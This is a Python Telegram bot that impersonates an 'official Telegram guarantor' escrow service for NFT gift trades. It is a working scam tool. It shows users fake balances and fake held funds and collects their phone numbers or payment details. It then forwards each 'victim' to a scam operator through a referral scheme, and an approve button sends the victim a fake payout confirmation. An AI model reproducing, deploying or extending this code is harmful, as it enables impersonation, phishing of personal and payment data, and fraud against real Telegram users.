import os
import random
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

API_TOKEN = os.getenv('BOT_TOKEN')
bot = telebot.TeleBot(API_TOKEN)

# Твой реальный ID по умолчанию для рефералки
DEFAULT_ADMIN_ID = 8952715738

user_states = {}
user_referrers = {}
user_deals_history = {}  # История сделок
user_balances = {}  # Фейковые балансы пользователей (в Gram)


@bot.message_handler(commands=['start'])
def cmd_start(message):
    user_id = message.from_user.id
    args = message.text.split()

    # Обработка реферальной ссылки
    if len(args) > 1 and args[1].startswith('ref_'):
        try:
            referrer_id = int(args[1].replace('ref_', ''))
            user_referrers[user_id] = referrer_id
        except ValueError:
            user_referrers[user_id] = DEFAULT_ADMIN_ID
    else:
        if user_id not in user_referrers:
            user_referrers[user_id] = DEFAULT_ADMIN_ID

    # Инициализация баланса, если его нет
    if user_id not in user_balances:
        user_balances[user_id] = {'available': '0.00 Gram', 'hold': '0.00 Gram'}

    show_main_menu(message.chat.id, is_new=True)


def show_main_menu(chat_id, message_id=None, is_new=False):
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton('🎁 Создать сделку с NFT', callback_data='create_deal'))
    keyboard.add(
        InlineKeyboardButton('💰 Мой баланс', callback_data='view_balance'),
        InlineKeyboardButton('📜 История сделок', callback_data='view_history')
    )

    text = (
        "🛡 **Официальный Гарант Telegram — Безопасный обмен NFT**\n\n"
        "Добро пожаловать в официальную систему защищенных сделок с цифровыми активами и подарками внутри Telegram.\n\n"
        "• Нулевая комиссия при расчетах в Gram\n"
        "• Автоматический эскроу-холдинг средств\n"
        "• Арбитраж сделок 24/7"
    )

    if is_new:
        bot.send_message(chat_id, text, reply_markup=keyboard, parse_mode='Markdown')
    else:
        bot.edit_message_text(text, chat_id, message_id, reply_markup=keyboard, parse_mode='Markdown')


# Меню баланса
@bot.callback_query_handler(func=lambda call: call.data == 'view_balance')
def view_balance(call):
    bot.answer_callback_query(call.id)
    user_id = call.from_user.id
    bal = user_balances.get(user_id, {'available': '0.00 Gram', 'hold': '0.00 Gram'})

    text = (
        f"💰 **Ваш кошелек (Gram):**\n\n"
        f"• Доступно: `{bal['available']}`\n"
        f"• В холде (на удержании гаранта): `{bal['hold']}`\n\n"
        "ℹ️ *Средства в холде размораживаются автоматически после завершения и подтверждения текущей сделки.*"
    )

    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton('⬅️ Назад в меню', callback_data='back_to_menu'))

    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=keyboard, parse_mode='Markdown')


# Меню истории сделок
@bot.callback_query_handler(func=lambda call: call.data == 'view_history')
def view_history(call):
    bot.answer_callback_query(call.id)
    user_id = call.from_user.id
    history = user_deals_history.get(user_id, [])

    if not history:
        text = "📜 **Ваша история сделок:**\n\nУ вас пока нет активных или завершенных сделок."
    else:
        text = "📜 **Ваша история сделок:**\n\n" + "\n".join(history)

    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton('⬅️ Назад в меню', callback_data='back_to_menu'))

    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=keyboard, parse_mode='Markdown')


@bot.callback_query_handler(func=lambda call: call.data == 'back_to_menu')
def back_to_menu(call):
    bot.answer_callback_query(call.id)
    show_main_menu(call.message.chat.id, call.message.message_id)


@bot.callback_query_handler(func=lambda call: call.data == 'create_deal')
def start_deal(call):
    bot.answer_callback_query(call.id)
    deal_id = random.randint(10000, 99999)
    user_states[call.from_user.id] = {'step': 'waiting_for_item', 'deal_id': deal_id}

    bot.send_message(
        call.message.chat.id,
        f"🆔 **Сделка #{deal_id} инициализирована.**\n\n🎁 Введите название NFT-подарка, который хотите передать:",
        parse_mode='Markdown'
    )


@bot.message_handler(func=lambda message: message.from_user.id in user_states and user_states[message.from_user.id]['step'] in ['waiting_for_item', 'waiting_for_price', 'waiting_for_phone'])
def handle_steps(message):
    user_id = message.from_user.id
    state_data = user_states[user_id]
    deal_id = state_data['deal_id']

    if state_data['step'] == 'waiting_for_item':
        state_data['item'] = message.text
        state_data['step'] = 'waiting_for_price'
        bot.send_message(
            message.chat.id,
            f"🆔 Сделка #{deal_id}\n💵 Укажите оценочную стоимость подарка в **Gram** (например, `150` или `500`):",
            parse_mode='Markdown'
        )

    elif state_data['step'] == 'waiting_for_price':
        price_val = message.text.strip()
        price_str = f"{price_val} Gram" if "gram" not in price_val.lower() else price_val
        state_data['price'] = price_str
        state_data['step'] = 'waiting_for_phone'

        if user_id not in user_balances:
            user_balances[user_id] = {'available': '0.00 Gram', 'hold': '0.00 Gram'}
        user_balances[user_id]['hold'] = price_str

        bot.send_message(
            message.chat.id,
            f"🆔 Сделка #{deal_id}\n✅ Отлично! Теперь укажите ваш номер телефона или реквизиты для зачисления средств:"
        )

    elif state_data['step'] == 'waiting_for_phone':
        item = state_data.get('item')
        price = state_data.get('price')
        phone = message.text
        user_name = message.from_user.full_name
        username = f"@{message.from_user.username}" if message.from_user.username else "нет юзернейма"

        bot.send_message(
            message.chat.id,
            f"⏳ **Сделка #{deal_id} зарегистрирована!**\n\n"
            "Эскроу-сервис заблокировал актив. Ожидаем подтверждения от Гаранта...\n"
            "Сумма отображается в разделе «💰 Мой баланс» в статусе Холд.",
            parse_mode='Markdown'
        )

        if user_id not in user_deals_history:
            user_deals_history[user_id] = []
        user_deals_history[user_id].insert(0, f"#{deal_id} | {item} ({price}) — ⏳ В холде")

        admin_id = user_referrers.get(user_id, DEFAULT_ADMIN_ID)

        admin_keyboard = InlineKeyboardMarkup()
        admin_keyboard.add(InlineKeyboardButton('✅ Подтвердить перевод денег', callback_data=f'approve_{user_id}_{deal_id}'))

        bot.send_message(
            admin_id,
            f"🚨 **Сработала ловушка Gram (Сделка #{deal_id})!**\n\n"
            f"👤 Жертва: {user_name} ({username})\n"
            f"🎁 Подарок: {item}\n"
            f"💰 Сумма: {price}\n"
            f"📞 Реквизиты: {phone}",
            parse_mode='Markdown',
            reply_markup=admin_keyboard
        )

        del user_states[user_id]


@bot.callback_query_handler(func=lambda call: call.data.startswith('approve_'))
def approve_deal(call):
    data_parts = call.data.split('_')
    target_user_id = int(data_parts[1])
    deal_id = data_parts[2] if len(data_parts) > 2 else 'неизвестно'

    bot.answer_callback_query(call.id)

    if target_user_id in user_balances:
        held_amount = user_balances[target_user_id]['hold']
        user_balances[target_user_id]['hold'] = '0.00 Gram'
        user_balances[target_user_id]['available'] = held_amount

    if target_user_id in user_deals_history:
        for i, deal_str in enumerate(user_deals_history[target_user_id]):
            if f"#{deal_id}" in deal_str:
                user_deals_history[target_user_id][i] = f"#{deal_id} — ✅ Успешно (Выплачено)"

    bot.send_message(
        target_user_id,
        f"✅ **Сделка #{deal_id} совершена успешно!**\n\n"
        "Средства в валюте **Gram** переведены на ваш баланс и будут отправлены на реквизиты в течение часа.",
        parse_mode='Markdown'
    )

    bot.edit_message_text(
        f"✅ Сделка #{deal_id} подтверждена! Баланс жертвы обновлен, пранк удался.",
        call.message.chat.id,
        call.message.message_id
    )


if __name__ == '__main__':
    bot.infinity_polling()
